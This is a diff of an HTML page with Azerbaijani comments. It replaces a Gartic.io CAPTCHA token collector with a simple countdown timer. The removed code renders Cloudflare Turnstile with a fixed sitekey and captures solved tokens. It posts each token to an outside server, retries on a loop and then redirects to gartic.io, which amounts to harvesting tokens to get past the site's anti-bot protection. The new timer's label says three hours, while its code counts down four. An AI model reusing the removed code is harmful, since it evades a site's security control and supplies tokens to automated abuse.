@@ -1,79 +1,90 @@
-l<!DOCTYPE html>
-<html lang="az">
+<!DOCTYPE html><html lang="az">
 <head>
-  <meta charset="UTF-8">
-  <title>Token Toplama Test (Gartic.io)</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>3 Saat Geri Sayım</title>
   <style>
-    body { margin:0; height:100vh; background:#111; color:#fff; font-family:Arial; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; }
-    h1 { color:#ff4444; font-size:3rem; }
-    #status { font-size:1.3rem; margin:1rem; color:#ffcc00; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+    }body {
+  height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #000; 
+}
+
+.overlay {
+  position: absolute;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.85);
+}
+
+.timer-box {
+  position: relative;
+  z-index: 1;
+  padding: 40px 60px;
+  border: 2px solid #b00000; 
+  border-radius: 0; 
+  text-align: center;
+  color: #e5e5e5;
+  background: #000;
+  box-shadow: 0 0 25px rgba(176, 0, 0, 0.4);
+}
+
+.timer-box h1 {
+  font-size: 28px;
+  margin-bottom: 20px;
+  letter-spacing: 2px;
+}
+
+.time {
+  font-size: 56px;
+  letter-spacing: 3px;
+  font-weight: bold;
+  text-shadow: 0 0 10px rgba(255,255,255,0.15);
+}
+
+.hint {
+  margin-top: 15px;
+  font-size: 12px;
+  opacity: 0.6;
+}
+
   </style>
 </head>
 <body>
-  <h1>Gartic.io Token Toplayıcı</h1>
-  <div id="status">Token axtarılır... (Gartic.io-da CAPTCHA yoxdursa işləməyəcək)</div>
+  <div class="overlay"></div>  <div class="timer-box">
+    <h1>GERİ SAYIM</h1>
+    <div id="time" class="time">03:00:00</div>
+    <div class="hint">HESEN PEYSER</div>
+  </div>  <script>
+    let totalSeconds = 4 * 60 * 60; 
 
-  <script>
-    const STATUS = document.getElementById('status');
-    const TOKEN_INTERVAL = 8000; // 8 saniyədən bir cəhd (çox tez olmasın)
+    const timeEl = document.getElementById('time');
 
-    function tryGetToken() {
-      STATUS.textContent = 'Turnstile yüklənir...';
+    function updateTimer() {
+      const hours = Math.floor(totalSeconds / 3600);
+      const minutes = Math.floor((totalSeconds % 3600) / 60);
+      const seconds = totalSeconds % 60;
 
-      // Real sitekey tapılmayıb – test üçün ümumi istifadə olunur, amma Gartic.io-da işləmir
-      const sitekey = '0x4AAAAAABBPKaIbNwnPEfSo'; // ← buranı dəyişmək lazımdır (real olarsa)
+      timeEl.textContent =
+        String(hours).padStart(2, '0') + ':' +
+        String(minutes).padStart(2, '0') + ':' +
+        String(seconds).padStart(2, '0');
 
-      window.turnstile?.render(document.body, {
-        sitekey: sitekey,
-        appearance: 'always',
-        callback: function(token) {
-          STATUS.textContent = 'Token alındı! Göndərilir...';
-          console.log('Token:', token);
-
-          // Serverə göndər (öz serverini qoy)
-          fetch('https://mesho.alwaysdata.net/add-token', {  // ← buranı öz serverinlə əvəz et
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ token, url: location.href })
-          })
-          .then(r => r.json())
-          .then(d => { STATUS.textContent = 'Uğurlu! Server cavabı: ' + JSON.stringify(d); })
-          .catch(e => { STATUS.textContent = 'Xəta: ' + e; console.error(e); });
-        },
-        'error-callback': function(err) {
-          STATUS.textContent = 'Xəta: ' + (err || 'Widget yüklənmədi – sitekey yanlış ola bilər');
-          console.error('Turnstile xətası:', err);
-        }
-      });
+      if (totalSeconds > 0) {
+        totalSeconds--;
+      } else {
+        timeEl.textContent = '00:00:00';
+        clearInterval(timerInterval);
+      }
     }
 
-    // İlk cəhd
-    if (window.turnstile) {
-      tryGetToken();
-    } else {
-      // Turnstile script-i yüklə (əgər səhifədə yoxdursa)
-      const script = document.createElement('script');
-      script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad';
-      script.async = true;
-      script.defer = true;
-      document.head.appendChild(script);
-
-      window.onTurnstileLoad = function () {
-        STATUS.textContent = 'Turnstile hazır – cəhd edilir';
-        tryGetToken();
-      };
-    }
-
-    // Təkrar cəhdlər
-    setInterval(() => {
-      if (document.querySelector('.cf-turnstile')) return; // artıq varsa təkrar etmə
-      tryGetToken();
-    }, TOKEN_INTERVAL);
-
-    // 10 saniyədən sonra Gartic.io-ya keç (istəyə görə sil bilərsən)
-    setTimeout(() => {
-      window.location.href = 'https://gartic.io';
-    }, 10000);
-  </script>
-</body>
+    updateTimer();
+    const timerInterval = setInterval(updateTimer, 1000);
+  </script></body>
 </html>
